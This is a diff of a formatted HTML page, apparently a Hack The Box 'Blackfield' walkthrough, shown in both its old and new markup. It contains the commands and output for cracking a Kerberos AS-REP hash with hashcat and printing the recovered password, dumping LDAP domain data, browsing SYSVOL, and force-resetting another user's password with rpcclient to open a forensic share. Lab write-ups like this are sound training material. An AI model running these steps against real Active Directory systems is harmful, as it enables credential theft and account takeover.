-Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">696</span> MB
-
-Dictionary cache built:                                                     
-* Filename..: ../wordlists/rockyou.txt
-* Passwords.: <span style="color:#ae81ff">14344391</span>
-* Bytes.....: <span style="color:#ae81ff">139921497</span>
-* Keyspace..: <span style="color:#ae81ff">14344384</span>
-* Runtime...: <span style="color:#ae81ff">2</span> secs
-
-Approaching final keyspace - workload adjusted.  
-
-$krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5a15a2fe622d597db5fd1$ee82925980a5e5adcdd235ef292b0c258aba9292d27417a581a4f8cf728383f4d589ab517539528fc6d3e5e7397036c11dd0375310b577bb8e76af07f4e62a1ba97b71aafdcb0eacb0dc8450ea6a92079208ed2353ab1756420ed65c66ce7b41cf2deb8dd0e920d7d5c8c9ce124db5857941db7e370811a4899b9e8273b430187c3f0238db1286a140a2a42cfcd82e1dba2f11ca4461c7dcf08cb4a1dcc49b9a5a513d058871a5c58bbb2b20d92a71ed1dc78c0e641228b951ab047c111b00d37fd3e4cdadf5edd91cc75a745bef770bb23c0dda85719f7572b01580eb47ea897695c99b418aa278b526e3a86d2ec581bbe23464:#00^BlackKnight
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: Kerberos 5, etype 23, AS-REP
-Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5...e23464
-Time.Started.....: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:59 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> secs<span style="color:#f92672">)</span>
-Time.Estimated...: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:06 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
-Guess.Base.......: File <span style="color:#f92672">(</span>../wordlists/rockyou.txt<span style="color:#f92672">)</span>
-Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
-Speed.#1.........:  2202.9 kH/s <span style="color:#f92672">(</span>7.55ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
-Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
-Progress.........: 14344384/14344384 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
-Rejected.........: 0/14344384 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
-Restore.Point....: 14303232/14344384 <span style="color:#f92672">(</span>99.71%<span style="color:#f92672">)</span>
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidates.#1....: $HEX<span style="color:#f92672">[</span>2a627269616e6e653031322a<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>
-Hardware.Mon.#1..: N/A
-
-Started: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:56 <span style="color:#ae81ff">2020</span>
-Stopped: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:07 <span style="color:#ae81ff">2020</span>
-</code></pre></div><p>We got a password: <code>#00^BlackKnight</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat --force -d <span style="color:#ae81ff">1</span> -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">18200</span> support.hash ../wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v5.1.0-1846-gf92df252<span style="color:#f92672">)</span> starting...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You have enabled --force to bypass dangerous warnings and errors!
+</span></span><span style="display:flex;"><span>This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
+</span></span><span style="display:flex;"><span>Do not report hashcat issues encountered when using --force.
+</span></span><span style="display:flex;"><span>/sys/bus/pci/devices/0000:00:00.0/pp_dpm_pcie: No such file or directory
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sys/bus/pci/devices/0000:00:00.0/pp_dpm_sclk: No such file or directory
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>First_file_in_directory<span style="color:#f92672">()</span> failed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sys/bus/pci/devices/0000:00:00.0/pp_dpm_mclk: No such file or directory
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>First_file_in_directory<span style="color:#f92672">()</span> failed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 1.1 Mesa 20.0.7<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [Mesa]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">========================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: Radeon RX 580 Series (POLARIS10, DRM 3.36.0, 5.6.15-arch1-1, LLVM 10.0.0), 8128/8192 MB (6553 MB allocatable), 36MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 2.1 AMD-APP <span style="color:#f92672">(</span>3075.10<span style="color:#f92672">))</span> - Platform <span style="color:#75715e">#2 [Advanced Micro Devices, Inc.]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">======================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#2: Ellesmere, skipped</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Applicable optimizers:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>* Single-Hash
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>Using pure kernels enables cracking longer passwords but <span style="color:#66d9ef">for</span> the price of drastically reduced performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized backend kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">696</span> MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache built:                                                     
+</span></span><span style="display:flex;"><span>* Filename..: ../wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344391</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921497</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344384</span>
+</span></span><span style="display:flex;"><span>* Runtime...: <span style="color:#ae81ff">2</span> secs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5a15a2fe622d597db5fd1$ee82925980a5e5adcdd235ef292b0c258aba9292d27417a581a4f8cf728383f4d589ab517539528fc6d3e5e7397036c11dd0375310b577bb8e76af07f4e62a1ba97b71aafdcb0eacb0dc8450ea6a92079208ed2353ab1756420ed65c66ce7b41cf2deb8dd0e920d7d5c8c9ce124db5857941db7e370811a4899b9e8273b430187c3f0238db1286a140a2a42cfcd82e1dba2f11ca4461c7dcf08cb4a1dcc49b9a5a513d058871a5c58bbb2b20d92a71ed1dc78c0e641228b951ab047c111b00d37fd3e4cdadf5edd91cc75a745bef770bb23c0dda85719f7572b01580eb47ea897695c99b418aa278b526e3a86d2ec581bbe23464:#00^BlackKnight
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Name........: Kerberos 5, etype 23, AS-REP
+</span></span><span style="display:flex;"><span>Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5...e23464
+</span></span><span style="display:flex;"><span>Time.Started.....: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:59 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:06 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>../wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:  2202.9 kH/s <span style="color:#f92672">(</span>7.55ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
+</span></span><span style="display:flex;"><span>Progress.........: 14344384/14344384 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/14344384 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 14303232/14344384 <span style="color:#f92672">(</span>99.71%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidates.#1....: $HEX<span style="color:#f92672">[</span>2a627269616e6e653031322a<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:56 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>Stopped: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:07 <span style="color:#ae81ff">2020</span>
+</span></span></code></pre></div><p>We got a password: <code>#00^BlackKnight</code></p>
 <ol start="7">
 <li>Dump LDAP domain data:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ldapdomaindump -u BLACKFIELD.LOCAL<span style="color:#ae81ff">\\</span>support -p <span style="color:#e6db74">&#34;#00^BlackKnight&#34;</span> -o ldapdomaindump_artifacts 10.10.10.192       
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
-</code></pre></div><p>We get these files</p>
-<pre><code>ldapdomaindump_artifacts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapdomaindump -u BLACKFIELD.LOCAL<span style="color:#ae81ff">\\</span>support -p <span style="color:#e6db74">&#34;#00^BlackKnight&#34;</span> -o ldapdomaindump_artifacts 10.10.10.192       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
+</span></span></code></pre></div><p>We get these files</p>
+<pre tabindex="0"><code>ldapdomaindump_artifacts
 ├── domain_computers_by_os.html
 ├── domain_computers.grep
 ├── domain_computers.html
@@ -1052,16 +1044,16 @@ Stopped: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:07 <span style="col
 </code></pre><ol start="8">
 <li>Discovered a possible target:</li>
 </ol>
-<pre><code>SAM name: svc_backup
+<pre tabindex="0"><code>SAM name: svc_backup
 Member of groups: Remote Management Users, Backup Operators
 Flags: NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
 </code></pre><ol start="9">
 <li>Get data from <code>SYSVOL</code>:</li>
 </ol>
-<pre><code>smbclient -U support //10.10.10.192/SYSVOL
-smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
-Enter WORKGROUP\support's password: #00^BlackKnight
-Try &quot;help&quot; to get a list of possible commands.
+<pre tabindex="0"><code>smbclient -U support //10.10.10.192/SYSVOL
+smbclient: Can&#39;t load /etc/samba/smb.conf - run testparm to debug it
+Enter WORKGROUP\support&#39;s password: #00^BlackKnight
+Try &#34;help&#34; to get a list of possible commands.
 smb: \&gt; ls
   .                                   D        0  Sun Feb 23 12:13:05 2020
   ..                                  D        0  Sun Feb 23 12:13:05 2020
@@ -1091,70 +1083,69 @@ smb: \BLACKFIELD.local\&gt;
 </code></pre><ol start="10">
 <li>Getting files content revealed group policy files:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#a6e22e">iconv -f UTF-16 -t UTF-8 &#34;./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>
-<span style="color:#66d9ef">[Unicode]</span>
-<span style="color:#a6e22e">Unicode</span><span style="color:#f92672">=</span><span style="color:#e6db74">yes</span>
-<span style="color:#66d9ef">[Registry Values]</span>
-<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
-<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
-<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
-<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
-<span style="color:#66d9ef">[Privilege Rights]</span>
-<span style="color:#a6e22e">SeAssignPrimaryTokenPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
-<span style="color:#a6e22e">SeAuditPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
-<span style="color:#a6e22e">SeBackupPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeBatchLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeChangeNotifyPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0</span>
-<span style="color:#a6e22e">SeCreatePagefilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeDebugPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeIncreaseBasePriorityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-90-0,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeIncreaseQuotaPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544,*S-1-5-20,*S-1-5-19</span>
-<span style="color:#a6e22e">SeInteractiveLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeLoadDriverPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeMachineAccountPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-11</span>
-<span style="color:#a6e22e">SeNetworkLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0</span>
-<span style="color:#a6e22e">SeProfileSingleProcessPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeRemoteShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeRestorePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeSecurityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeSystemEnvironmentPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeSystemProfilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeSystemTimePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544,*S-1-5-19</span>
-<span style="color:#a6e22e">SeTakeOwnershipPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeUndockPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#a6e22e">SeEnableDelegationPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
-<span style="color:#66d9ef">[Version]</span>
-<span style="color:#a6e22e">signature</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$CHICAGO$&#34;</span>
-<span style="color:#a6e22e">Revision</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>
-</code></pre></div><h2 id="foothold">Foothold</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">iconv -f UTF-16 -t UTF-8 &#34;./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Unicode]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Unicode</span><span style="color:#f92672">=</span><span style="color:#e6db74">yes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Registry Values]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Privilege Rights]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeAssignPrimaryTokenPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeAuditPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeBackupPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeBatchLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeChangeNotifyPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeCreatePagefilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeDebugPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeIncreaseBasePriorityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-90-0,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeIncreaseQuotaPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544,*S-1-5-20,*S-1-5-19</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeInteractiveLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeLoadDriverPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeMachineAccountPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-11</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeNetworkLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeProfileSingleProcessPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeRemoteShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeRestorePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeSecurityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeSystemEnvironmentPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeSystemProfilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeSystemTimePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544,*S-1-5-19</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeTakeOwnershipPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeUndockPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SeEnableDelegationPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Version]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">signature</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$CHICAGO$&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Revision</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>
+</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
 <ol>
 <li>We can try to <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">change password</a> for <code>audit2020</code> user:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient -U support //10.10.10.192
-Enter WORKGROUP<span style="color:#ae81ff">\s</span>upport<span style="color:#e6db74">&#39;s password: #00^BlackKnight
-</span><span style="color:#e6db74">rpcclient $&gt; setuserinfo2 audit2020 23 &#39;</span>Password!<span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">rpcclient $&gt; exit
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">smbclient -U audit2020 //10.10.10.192/forensic
-</span><span style="color:#e6db74">Enter WORKGROUP\audit2020&#39;</span>s password: Password!
-Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
-smb: <span style="color:#ae81ff">\&gt;</span> ls
-  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
-  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
-  commands_output                     D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 19:14:37 <span style="color:#ae81ff">2020</span>
-  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Thu May <span style="color:#ae81ff">28</span> 22:28:33 <span style="color:#ae81ff">2020</span>
-  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:39:08 <span style="color:#ae81ff">2020</span>
-
-		<span style="color:#ae81ff">7846143</span> blocks of size 4096. <span style="color:#ae81ff">3825653</span> blocks available
-smb: <span style="color:#ae81ff">\&gt;</span> mget *
-NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\*</span>
-smb: <span style="color:#ae81ff">\&gt;</span>
-
-</code></pre></div><ol start="2">
